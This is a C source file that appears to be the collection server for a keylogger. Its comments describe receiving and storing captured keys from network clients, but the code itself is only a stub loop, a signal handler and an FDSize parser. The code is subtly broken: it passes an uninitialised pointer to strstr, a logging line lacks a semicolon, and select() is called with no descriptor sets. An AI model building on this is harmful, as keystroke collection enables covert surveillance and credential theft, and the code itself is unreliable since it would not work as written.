/*
    stores main loop logic (that is managing entering / ending connections &
    logging them keys)
*/

#include <ctype.h>
#include <fcntl.h>
#include <signal.h>
#include <stdlib.h>
#include <string.h>
#include <sys/select.h>
#include <unistd.h>
#include "server.h"

/*
    - call select() to know which available (net) sockets are ready to
    do something
    - accept incoming connections if any & assign new socket for each
    - read from all available sockets
    - if new keys are dumped, lets get xkbcontext & read the new keys
    - check which items are to be stored in database
    - store it by bulk updates
        -> if anything fucks up at any point just trigger cleanup routine
*/
void
loop(server_t* instance)
{

    while (should_gracefully_exit(0))
    {
        int fdsize = get_fd_size();
        if (fdsize == -1)
            break;

        int sstat = select(fdsize, NULL, NULL, NULL, NULL);
        if (sstat == -1)
        {
#ifdef DEBUG
            DEBUG_LOG("select: %s", strerror(errno));
#endif
            break;
        }
    }
}

int
should_gracefully_exit(int code)
{
    static int should_exit = 0;

    if (code != 0 || should_exit)
    {
#ifdef DEBUG
        DEBUG_LOG("[+] caught code: %d\n", code)
#endif
        should_exit = 1;
    }
    return should_exit;
}

static void
sig_handler(int code)
{
    if (code == SIGINT)
        should_gracefully_exit(code);
}

int
get_fd_size(void)
{

    const char fdsize[] = "FDSize:";
    char buf[4096] = { 0 };
    int statfd = open("/proc/self/status", O_RDONLY);

    if (statfd < 0)
    {
#ifdef DEBUG
        DEBUG_LOG("open statfd: %s", strerror(errno));
#endif

        return -1;
    }

    const ssize_t num_read = read(statfd, buf, sizeof(buf) - 1);
    if (num_read <= 0)
    {
#ifdef DEBUG
        DEBUG_LOG("read statfd: %s", strerror(errno));
#endif

        return -1;
    }

    buf[num_read] = '\0';

    const char* fdsize_ptr = strstr(buf, fdsize_ptr);
    if (!fdsize_ptr)
        return 256;

    for (const char* char_ptr = fdsize_ptr + sizeof(fdsize) - 1; char_ptr <= buf + num_read; ++char_ptr)
    {
        if (isspace(*char_ptr))
            continue;
        else if (*char_ptr == 0)
            return 256;

        return atoi(char_ptr);
    }

    return 256;
}
